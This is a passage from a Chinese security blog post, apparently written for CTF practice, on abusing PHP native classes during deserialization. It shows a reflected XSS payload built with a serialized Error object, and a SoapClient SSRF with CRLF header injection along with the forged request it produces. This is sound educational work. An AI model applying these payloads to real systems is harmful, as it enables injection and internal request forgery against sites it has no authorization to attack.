class_">BadMethodCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveCachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileInfo</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveDirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">GlobIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplTempFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFixedArray</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SodiumException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">SodiumException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__toString</span></span><br><span class="line">FFI<span class="title class_">\Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line">FFI<span class="title class_">\Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line">FFI<span class="title class_">\ParserException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line">FFI<span class="title class_">\ParserException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">IntlException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">IntlException</span>::<span class="variable constant_">__toString</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SimpleXMLIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PhpToken</span>::<span class="variable constant_">__toString</span></span><br></pre></td></tr></table></figure></div>
+
+<p>其中与反序列化利用相关的原生类有：</p>
+<ul>
+<li><code>Exception</code>：所有异常的基类。</li>
+<li><code>Error</code></li>
+<li><code>ZipArchive</code>：用于创建、读取、修改 <code>.zip</code> 压缩包的类。</li>
+<li><code>SoapClient</code>：PHP 原生的 SOAP 客户端，用于远程调用服务。</li>
+</ul>
+<h2 id="使用-Error-Exception-内置类进行-XSS"><a href="#使用-Error-Exception-内置类进行-XSS" class="headerlink" title="使用 Error&#x2F;Exception 内置类进行 XSS"></a>使用 <code>Error</code>&#x2F;<code>Exception</code> 内置类进行 XSS</h2><p>在许多 <strong>CMS、后台日志查看器、调试工具等</strong>中可能存在下面这种代码逻辑：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 假设从 GET 请求参数中获取序列化对象</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化后直接输出对象（触发 __toString）</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>如果我们能通过一个反序列化原生类，让该原生类的 <code>__toString</code> 返回一段可控数据，那么这段数据就可以被插入到 HTML 页面上形成反射型 XSS。</p>
+<p>在 PHP 中有 <code>Error</code> 和 <code>Exception</code> 是 PHP 内置的异常处理基类。</p>
+<ul>
+<li><code>Exception</code> 类是 PHP 中最早引入的异常处理类（自 PHP 5 起）,用于<strong>程序逻辑异常</strong>的捕获和处理（如数据库错误、文件未找到、用户输入不合法等）。</li>
+<li><code>Error</code> 类是 PHP 7 引入的新异常类型，用于表示<strong>致命错误</strong>（如类型错误、算术错误等），补充了原本 <code>Exception</code> 处理不到的运行时错误。这个类是所有 PHP 内部错误类（如 <code>TypeError</code>, <code>ParseError</code>）的父类。</li>
+</ul>
+<p>由于 <code>Error</code> 和 <code>Exception</code> 都实现了 <code>__toString()</code> 方法，它们继承自 <code>Throwable</code> 接口（PHP7+），内部 <code>__toString()</code> 方法会返回的字符串受对象本身控制。因此这两个类都满足上述情境。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ZEND_METHOD(Exception, __toString)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (ZSTR_LEN(message) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      zval message_zv;</span><br><span class="line">      ZVAL_STR(&amp;message_zv, message);</span><br><span class="line"></span><br><span class="line">      str = zend_strpprintf_unchecked(<span class="number">0</span>, <span class="string">&quot;%S: %S in %S:&quot;</span> ZEND_LONG_FMT <span class="string">&quot;\nStack trace:\n%S%s%S&quot;</span>,</span><br><span class="line">        name, message, file, line,</span><br><span class="line">        tmp_trace, ZSTR_LEN(prev_str) ? <span class="string">&quot;\n\nNext &quot;</span> : <span class="string">&quot;&quot;</span>, prev_str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">  RETURN_STR(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>以 <code>Error</code> 类为例，如我们构造下面这个 <code>Error</code> 对象并获取序列化的结果：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 构造恶意对象</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="comment">// $a = new Exception(&quot;&lt;script&gt;alert(&#x27;xss2&#x27;)&lt;/script&gt;&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化并 urlencode（用于 GET 传参）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
+
+<p>那么这段序列化数据在被反序列化后，其中的 JS 代码会被插入到 <code>__toString</code> 返回结果中。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error: &lt;script&gt;alert(1)&lt;/script&gt; in /home/user/scripts/code.php:3</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="利用-SoapClient-类进行-SSRF"><a href="#利用-SoapClient-类进行-SSRF" class="headerlink" title="利用 SoapClient 类进行 SSRF"></a>利用 SoapClient 类进行 SSRF</h2><p><code>SoapClient</code> 是 PHP 官方提供的 <strong>SOAP WebService 客户端</strong>。</p>
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>该扩展默认不开启，我们需要修改 <code>php.ini</code> 开启扩展。</p>
+<div class="code-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extension</span>=soap</span><br></pre></td></tr></table></figure></div>
+
+<p>另外在 Linux 下还要安装扩展：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install php-soap</span><br></pre></td></tr></table></figure></div>
+
+    </div>
+  </div>
+
+<p>在非‑WSDL 模式下，只要给它一组 <code>location</code>&#x2F;<code>uri</code> 参数，就能自动把一次方法调用包装成 HTTP&#x2F;HTTPS POST 请求并发送——这恰恰为 <strong>服务器端向任意地址发包</strong> 提供了便利。更重要的是：</p>
+<ul>
+<li><code>SoapClient</code> 可以被 <strong>序列化 &#x2F; 反序列化</strong>；</li>
+<li>反序列化后，如果代码里对该对象调用了一个「<strong>不存在</strong>」的方法，<code>__call()</code> 会被触发，进而 <strong>自动发请求</strong>；</li>
+<li><code>user_agent</code> 等可控字段允许插入 <code>\r\n</code>，可扩展为 <strong>CRLF 注入</strong> 来伪造额外请求头或请求体。</li>
+</ul>
+<p>例如我们按下面这样构造一个 <code>SoapClient</code> 对象并且调用不存在的方法触发 <code>__call</code> 魔术方法：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span>  = <span class="string">&quot;evil\r\n&quot;</span></span><br><span class="line">     . <span class="string">&quot;X-Forwarded-For: 127.0.0.1,127.0.0.1\r\n&quot;</span></span><br><span class="line">     . <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span></span><br><span class="line">     . <span class="string">&quot;Content-Length: 13\r\n&quot;</span></span><br><span class="line">     . <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">     . <span class="string">&quot;token=ctfshow&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, [</span><br><span class="line">  <span class="string">&#x27;location&#x27;</span>   =&gt; <span class="string">&#x27;http://127.0.0.1:8000/flag.php&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;uri&#x27;</span>        =&gt; <span class="string">&#x27;http://dummy/&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>,</span><br><span class="line">  <span class="string">&#x27;exceptions&#x27;</span> =&gt; <span class="number">0</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">foo</span>();</span><br></pre></td></tr></table></figure></div>
+
+<p>则会触发 SSRF：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: evil</span><br><span class="line">X-Forwarded-For: 127.0.0.1,127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">token=ctfshow</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;http://dummy/#foo&quot;</span><br><span class="line">Content-Length: 376</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;http://dummy/&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:foo/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>在构造 <code>SoapClient</code> 对象的时候会将传入的 <code>location</code> 还有 <code>user_agent</code> 写入对象属性。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 非‑WSDL 模式必须手动给 location */</span></span><br><span class="line"><span class="keyword">if</span> ((tmp = zend_hash_str_find(ht, <span class="string">&quot;location&quot;</span>, <span class="number">8</span>)) &amp;&amp; Z_TYPE_P(tmp) == IS_STRING) &#123;</span><br><span class="line">    ZVAL_STR_COPY(Z_CLIENT_LOCATION_P(this_ptr), Z_STR_P(tmp));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 可选 user_agent -&gt; 直接写入对象属性 */</span></span><br><span class="line"><span class="keyword">if</span> ((tmp = zend_hash_str_find(ht, <span class="string">&quot;user_agent&quot;</span>, <span class="number">10</span>)) &amp;&amp; Z_TYPE_P(tmp) == IS_STRING) &#123;</span><br><span class="line">    ZVAL_STR_COPY(Z_CLIENT_USER_AGENT_P(this_ptr), Z_STR_P(tmp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在我们调用 <code>SoapClient</code> 的一个不存在的方法时会有如下调用链：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌─ 用户代码          <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">foo</span>()           <span class="comment"># foo() 并不存在</span></span><br><span class="line">│</span><br><span class="line">├─ <span class="title class_">SoapClient</span>::<span class="title function_ invoke__">__call</span>()                       <span class="comment"># zend_compile.c ➜ arginfo_soapclient___call</span></span><br><span class="line">│    ↳ <span class="title function_ invoke__">soap_client_call_common</span>()</span><br><span class="line">│        ↳ <span class="title function_ invoke__">do_soap_call</span>()</span><br><span class="line">│            ↳ <span class="title function_ invoke__">do_request</span>()</span><br><span class="line">│                ↳ <span class="title class_">SoapClient</span>::<span class="title function_ invoke__">__doRequest</span>()  <span class="comment"># 默认实现；可被 override</span></span><br><span class="line">│                    ↳ <span class="title function_ invoke__">make_http_soap_request</span>()   (libcurl / php_stream)</span><br><span class="line">│                        ↳ 发送 HTTP/HTTPS 请求</span><br><span class="line">└─ HTTP response 解析 → <span class="title function_ invoke__">parse_packet_soap</span>() → 返回</span><br></pre></td></tr></table></figure></div>
+
+<p>其中 <code>location</code> 会在  <code>soap_client_call_common</code> 函数中被取出。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// L4635 选取 location</span></span><br><span class="line"><span class="keyword">if</span> (location == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    tmp = Z_CLIENT_LOCATION_P(this_ptr);         <span class="comment">// ← 取出刚才存的指针</span></span><br><span class="line">    <span class="keyword">if</span> (Z_TYPE_P(tmp) == IS_STRING) &#123;</span><br><span class="line">        location = Z_STR_P(tmp);                 <span class="comment">// 直接赋给 C 层指针变量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在  <code>do_soap_call</code> 函数中作为请求的 URL 传入  <code>do_request</code> 函数。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Non‑WSDL 分支</span></span><br><span class="line"><span class="keyword">if</span> (location == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    add_soap_fault_en(... <span class="string">&quot;&#x27;location&#x27; option is required&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">request = serialize_function_call(...);</span><br><span class="line">ret = do_request(this_ptr, request, location, action, ...);</span><br></pre></td></tr></table></figure></div>
+
+<p>最终调用到 <code>make_http_soap_request</code> 函数，此时构造函数传入的 <code>user_agent</code> 会被 <code>curl_slist_append</code> 函数添加到请求头 <code>headers</code> 中。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl_easy_setopt(curl, CURLOPT_URL, location);          <span class="comment">// ← 完整 SSRF</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/* 构造 header 列表，先加入默认 UA，再判断自定义 UA */</span></span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_P(Z_CLIENT_USER_AGENT_P(client)) == IS_STRING) &#123;</span><br><span class="line">    headers = curl_slist_append(headers,</span><br><span class="line">        Z_STRVAL_P(Z_CLIENT_USER_AGENT_P(client)));     <span class="comment">// ← CRLF 注入入口</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* headers 交给 curl_easy_setopt(CURLOPT_HTTPHEADER, headers) */</span></span><br><span class="line">...</span><br><span class="line">curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);</span><br><span class="line">curl_easy_perform(curl);</span><br></pre></td></tr></table></figure></div>
+
+<p>由于 <code>curl_slist_append()</code> <strong>不会过滤</strong> <code>\r</code> 或 <code>\n</code>：</p>
+<ul>
+<li>只要在 UA 里插入 <code>\r\n</code> 并加上一个空行，后面的部分就被当成<strong>新的 Header</strong>；</li>
+<li>再插入 <code>\r\n\r\ntoken=ctfshow</code>，即可把原本的 XML 丢掉，让 body 变成自定义表单数据。</li>
+</ul>
+<h2 id="利用-ZipArchive-进行文件操作"><a href="#利用-ZipArchive-进行文件操作" class="headerlink" title="利用 ZipArchive 进行文件操作"></a>利用 ZipArchive 进行文件操作</h2>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> PHP 原生类利用</li>
+        <li><strong>Author:</strong> sky123</li>
+        <li><strong>Created at
+                :</strong> 2025-08-11 23:53:58</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-02 21:33:10
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://skyi23.github.io/2025/08/11/PHP 原生类利用/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/php-web/">#php web</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/08/11/Pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Pickle 反序列化</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/11/PHP%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">PHP 模板注入</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'skyI23/my-giscus-discussions',
+                'data-repo-id': 'R_kgDONL9k_w',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'bottom',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">PHP 原生类利用</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="nav-text">PHP 原生类利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Error-Exception-%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8C-XSS"><span class="nav-text">使用 Error&#x2F;Exception 内置类进行 XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-SoapClient-%E7%B1%BB%E8%BF%9B%E8%A1%8C-SSRF"><span class="nav-text">利用 SoapClient 类进行 SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-ZipArchive-%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-text">利用 ZipArchive 进行文件操作</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        47 posts in total
+                    </span>
+                    
+                        <span>
+                            758.1k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
